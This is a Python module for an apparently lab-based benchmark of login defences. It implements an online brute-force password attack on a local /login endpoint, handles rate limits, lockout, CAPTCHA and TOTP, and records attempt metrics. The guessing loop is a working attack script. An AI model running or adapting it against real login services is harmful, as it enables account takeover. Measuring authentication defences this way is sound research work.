import requests
import time
from .metrics import AttackMetrics
from .password_generator import PasswordGenerator


class BruteforceAttack:
    def __init__(self, base_url="http://127.0.0.1:5000", group_seed=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.group_seed = group_seed

    def get_captcha_token(self):
        """Get a valid CAPTCHA token from the admin endpoint"""
        if not self.group_seed:
            raise ValueError("group_seed not provided, cannot get CAPTCHA token")
        try:
            response = self.session.get(
                f"{self.base_url}/admin/captcha_token",
                params={"group_seed": str(self.group_seed)},
                timeout=10,
            )
            if response.status_code == 200:
                data = response.json()
                return data.get("token")
            else:
                print(f"Failed to get CAPTCHA token: {response.status_code}")
                return None
        except Exception as e:
            print(f"Error getting CAPTCHA token: {e}")
            return None

    def attack(
        self,
        username: str,
        difficulty: str = "easy",
        metrics: AttackMetrics = None,
        delay: float = 0.01,
        max_attempts: int = None,
        max_time: float = None,
        run_until_worst: bool = False,
    ):
        """
        Bruteforce attack on a user

        Args:
            username: target username
            difficulty: password difficulty (easy, medium, hard)
            metrics: AttackMetrics object for data collection
            delay: delay between each attempt (in seconds)
            max_attempts: maximum number of attempts (None = try entire solution space)
            max_time: maximum time in seconds (None = no time limit)
            run_until_worst: if True, continue until both max_attempts and max_time are exhausted
        """

        generator_max_attempts = None if run_until_worst else max_attempts
        password_generator = PasswordGenerator(
            difficulty=difficulty, max_attempts=generator_max_attempts
        )

        max_time_str = f"{max_time}s" if max_time else "unlimited"
        max_attempts_str = str(max_attempts) if max_attempts else "unlimited"
        worst_str = " (run_until_worst)" if run_until_worst else ""
        print(
            f"Starting Bruteforce on '{username}' (difficulty: {difficulty}, max_attempts: {max_attempts_str}, max_time: {max_time_str}{worst_str})..."
        )

        metrics.start()
        found_password = None
        i = 0
        start_time = time.time()
        attempts_exhausted = False
        time_exhausted = False

        need_captcha = False
        captcha_token_value = None

        for password in password_generator.generate_bruteforce():
            elapsed_time = time.time() - start_time

            if max_time is not None and elapsed_time >= max_time:
                if not run_until_worst:
                    print(f"Time limit reached ({max_time}s) after {i} attempts")
                    break
                else:
                    time_exhausted = True

            should_make_attempt = True
            if max_attempts is not None and i >= max_attempts:
                if run_until_worst:
                    attempts_exhausted = True
                    should_make_attempt = False
                else:
                    print(
                        f"Attempt limit reached ({max_attempts}) after {elapsed_time:.1f}s"
                    )
                    break

            if run_until_worst:
                attempts_done = max_attempts is None or attempts_exhausted
                time_done = max_time is None or time_exhausted
                if attempts_done and time_done:
                    print(
                        f"Both constraints exhausted (attempts: {i}, time: {elapsed_time:.1f}s)"
                    )
                    break
                if not should_make_attempt:
                    if delay > 0:
                        time.sleep(delay)
                    continue

            i += 1
            start = time.time()

            try:
                login_payload = {"username": username, "password": password}
                if need_captcha and captcha_token_value:
                    login_payload["captcha_token"] = captcha_token_value

                response = self.session.post(
                    f"{self.base_url}/login",
                    json=login_payload,
                    timeout=30,
                )

                latency = int((time.time() - start) * 1000)

                if response.status_code == 200:
                    data = response.json()
                    success = data.get("success", False)

                    if success:
                        found_password = password
                        metrics.record_attempt(True, latency)
                        print(f"PASSWORD FOUND: {password} (attempt #{i})")
                        break
                    else:
                        metrics.record_attempt(False, latency)
                else:
                    metrics.record_attempt(False, latency)

                    if response.status_code == 429:
                        retry_after = float(response.headers.get("Retry-After"))
                        time.sleep(retry_after)
                    elif response.status_code == 403:
                        data = response.json()
                        if "locked" in data.get("error", ""):
                            print(f"Account locked at attempt #{i}")
                            break

                        elif data.get(
                            "captcha_required"
                        ) or "invalid_captcha" in data.get("error", ""):
                            print(f"CAPTCHA required at attempt #{i}, getting token...")
                            need_captcha = True
                            captcha_token_value = self.get_captcha_token()
                            continue
                    elif response.status_code == 401:
                        # user enabled totp
                        print(
                            f"User password was guessed, but user enabled TOTP. Stopping"
                        )
                        break

            except Exception as e:
                print(f"Error: {e}")
                metrics.record_attempt(False, 0)

            if i % 10 == 0:
                metrics.sample_resources()

            if delay > 0:
                time.sleep(delay)

        metrics.stop()

        if not found_password:
            print(f"Failed: password not found after {i} attempts")

        return found_password
